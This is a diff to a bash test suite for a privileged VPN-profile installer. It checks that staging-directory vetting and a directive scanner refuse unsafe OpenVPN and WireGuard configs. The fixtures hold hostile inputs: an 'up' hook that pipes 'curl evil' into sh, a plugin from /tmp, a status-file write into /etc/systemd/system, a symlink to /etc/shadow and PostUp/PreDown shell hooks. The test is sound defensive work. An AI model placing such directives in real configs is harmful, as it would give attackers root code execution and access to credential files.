@@ -13,6 +13,16 @@ trap 'rm -rf "$TMP"' EXIT
 pass=0
 fail=0
 
+# The helper is exercised two ways. Most of it is run as a subprocess, the way
+# pkexec runs it. The two functions that stand between an untrusted config and
+# root — vet_staging_dir and reject_unsafe_directives — are also called
+# directly, because the code around them in cmd_install needs real root and
+# these must not be the checks with no unprivileged test. Sourcing the helper
+# defines its functions and runs nothing.
+# shellcheck source=../bin/install-profile
+source "$HELPER"
+set +e -uo pipefail  # the helper's `set -e` would abort this suite on a refusal
+
 # Asserts the helper refuses, and refuses for the stated reason rather than by
 # tripping over something later.
 refuses() {
@@ -63,22 +73,46 @@ else
 fi
 
 echo "# staging directory vetting"
+
+# vet_staging_dir runs against the root-owned copy, so it is called here
+# directly rather than through cmd_install, which cannot get that far without
+# real root.
+vets() {
+  local because="$1" name="$2" dir="$3" output code
+  output="$( (vet_staging_dir openvpn "$name" "$dir") 2>&1 )"
+  code=$?
+  if [[ $code -eq 0 ]]; then
+    echo "not ok - should have refused ($because)"
+    fail=$((fail + 1))
+  elif [[ $output != *"$because"* ]]; then
+    echo "not ok - refused for the wrong reason ($because): $output"
+    fail=$((fail + 1))
+  else
+    echo "ok - refuses $because"
+    pass=$((pass + 1))
+  fi
+}
+
 mkdir -p "$TMP/staging"
-refuses "no work.conf" install openvpn work "$TMP/staging"
+vets "no work.conf" work "$TMP/staging"
 
 printf 'client\nremote a 1194\n' > "$TMP/staging/work.conf"
+# The symlink that used to be a check/use race: it was validated here and
+# reopened by `install` afterwards. It is now refused on a root-owned copy that
+# the caller can no longer touch — and copied with --no-dereference, so even
+# the refusal never read /etc/shadow.
 ln -s /etc/shadow "$TMP/staging/work.key"
-refuses "symlink" install openvpn work "$TMP/staging"
+vets "symlink" work "$TMP/staging"
 
 rm -f "$TMP/staging/work.key"
 mkdir -p "$TMP/staging/work.sub"
-refuses "not a regular file" install openvpn work "$TMP/staging"
+vets "not a regular file" work "$TMP/staging"
 
 rmdir "$TMP/staging/work.sub"
 touch "$TMP/staging/somebodyelse.conf"
-refuses "does not belong to profile" install openvpn work "$TMP/staging"
-
+vets "does not belong to profile" work "$TMP/staging"
 rm -f "$TMP/staging/somebodyelse.conf"
+
 refuses "does not exist" install openvpn work "$TMP/nonexistent"
 
 ln -s "$TMP/staging" "$TMP/linked"
@@ -116,60 +150,144 @@ else
   fail=$((fail + 1))
 fi
 
-echo "# stage-profile reports a hook that is not on this system"
-# The unprivileged half. A hook is never staged — it stays where it was
-# installed — so the only thing worth doing at import time is looking, which
-# the pure config parser cannot do.
+echo "# the config scan, which is the last thing between a profile and root"
+
+# reject_unsafe_directives is the second enforcement of the lists in
+# backends/*/Config.js, and the only one that runs with privilege — the first
+# runs as the user, so from root's point of view it is input rather than a
+# check. Sourced and called directly: everything else in cmd_install needs real
+# root, and this must not be the one check with no unprivileged test.
+#
+# Called in a subshell throughout, because die() exits.
+
+scans() {
+  local expectation="$1" protocol="$2" body="$3" because="${4-}"
+  local file="$TMP/scan.conf" output code
+  printf '%s\n' "$body" > "$file"
+  output="$( (reject_unsafe_directives "$protocol" "$file") 2>&1 )"
+  code=$?
+
+  if [[ $expectation == refuse ]]; then
+    if [[ $code -eq 0 ]]; then
+      echo "not ok - should have refused: $because"
+      fail=$((fail + 1))
+    elif [[ -n $because && $output != *"$because"* ]]; then
+      echo "not ok - refused without naming $because: $output"
+      fail=$((fail + 1))
+    else
+      echo "ok - refuses $protocol $because"
+      pass=$((pass + 1))
+    fi
+  else
+    if [[ $code -eq 0 ]]; then
+      echo "ok - accepts $protocol $because"
+      pass=$((pass + 1))
+    else
+      echo "not ok - refused a good config ($because): $output"
+      fail=$((fail + 1))
+    fi
+  fi
+}
+
+# Code execution as root, the reason any of this exists.
+scans refuse openvpn 'client
+remote a 1194
+script-security 2
+up /bin/sh -c "curl evil | sh"' "up"
+
+# A plugin needs no script-security at all, which is what makes leaving it off
+# the list worse than leaving off a script hook.
+scans refuse openvpn 'client
+remote a 1194
+plugin /tmp/evil.so' "plugin"
+
+# OpenVPN accepts a directive in a config file spelled either way, so the
+# `--` form has to be the same directive here or it is simply a bypass.
+scans refuse openvpn 'client
+remote a 1194
+--up /bin/sh' "up"
+
+# Quoting is the other spelling OpenVPN accepts.
+scans refuse openvpn 'client
+remote a 1194
+"up" /bin/sh' "up"
+
+# A file write at a path the profile chooses. ProtectSystem=true leaves /etc
+# writable, so this reaches /etc/systemd/system.
+scans refuse openvpn 'client
+remote a 1194
+status /etc/systemd/system/x.service' "status"
+
+# The failure that would matter most in the field: a profile that is fine
+# being refused. A PEM body is data, and base64 can begin with anything.
+scans accept openvpn 'client
+remote a 1194
+<ca>
+-----BEGIN CERTIFICATE-----
+up
+plugin
+status
+-----END CERTIFICATE-----
+</ca>' "an inline block containing the keywords as data"
+
+# Privilege-dropping directives are common in real profiles and must survive.
+scans accept openvpn 'client
+remote a 1194
+user nobody
+group nobody
+persist-key' "user/group, which drop privilege rather than take it"
+
+# wg-quick eval()s these, as root, from its own unit.
+scans refuse wireguard '[Interface]
+PrivateKey = k
+PostUp = /bin/sh -c evil' "postup"
+
+# wg-quick reads its keys case-insensitively, so this list has to as well.
+scans refuse wireguard '[Interface]
+PrivateKey = k
+predown=/bin/sh' "predown"
+
+scans accept wireguard '[Interface]
+PrivateKey = k
+Address = 10.0.0.2/32
+DNS = 10.0.0.1
+
+[Peer]
+PublicKey = p
+Endpoint = a.example.com:51820' "an ordinary profile"
+
+echo "# stage-profile"
+
 STAGER="$ROOT/bin/stage-profile"
 STAGING="${XDG_CACHE_HOME:-$HOME/.cache}/connor.vpn/staging/__test-hooks"
 
 out="$(printf 'client\n' | XDG_CACHE_HOME="${XDG_CACHE_HOME:-$HOME/.cache}" \
   bash "$STAGER" "$STAGING" "__test-hooks.conf" \
-  --hook /usr/bin/env --hook /usr/bin/definitely-not-installed \
   --command sh --command definitely-not-a-command 2>&1)"
 code=$?
 rm -rf -- "$STAGING"
 
 if [[ $code -ne 0 ]]; then
-  echo "not ok - stage-profile accepts --hook"
+  echo "not ok - stage-profile stages a config"
   echo "$out" | sed 's/^/  /'
   fail=$((fail + 1))
 else
-  echo "ok - stage-profile accepts --hook"
+  echo "ok - stage-profile stages a config"
   pass=$((pass + 1))
 fi
 
-if [[ $out == *"missing-hook: /usr/bin/definitely-not-installed"* ]]; then
-  echo "ok - reports the hook that is absent"
-  pass=$((pass + 1))
-else
-  echo "not ok - reports the hook that is absent"
-  echo "$out" | sed 's/^/  /'
-  fail=$((fail + 1))
-fi
-
-# The half that matters more: a hook that IS present must stay silent, or every
-# working profile grows a false warning at import.
-if [[ $out != *"missing-hook: /usr/bin/env"* ]]; then
-  echo "ok - stays quiet about a hook that is present"
+# There is no --hook any more: hooks are removed at import, so nothing is left
+# to look for. Accepting the flag again would mean a hook had survived.
+if ! printf 'client\n' | bash "$STAGER" "$STAGING" "x.conf" --hook /usr/bin/env >/dev/null 2>&1; then
+  echo "ok - stage-profile no longer takes --hook"
   pass=$((pass + 1))
 else
-  echo "not ok - warned about a hook that exists"
-  echo "$out" | sed 's/^/  /'
+  echo "not ok - stage-profile still takes --hook"
   fail=$((fail + 1))
 fi
+rm -rf -- "$STAGING"
 
-# A missing hook is a warning, not a refusal: it may legitimately be installed
-# before the tunnel is first used.
-if [[ $code -eq 0 ]]; then
-  echo "ok - a missing hook does not abort the import"
-  pass=$((pass + 1))
-else
-  echo "not ok - a missing hook aborted the import"
-  fail=$((fail + 1))
-fi
-
-# --command is the PATH-resolved twin of --hook, used for the wg-quick DNS
+# --command is used for the wg-quick DNS
 # trap: `DNS =` is applied with resolvconf, which comes from an optional
 # dependency that is not in Omarchy's base.
 if [[ $out == *"missing-command: definitely-not-a-command"* ]]; then
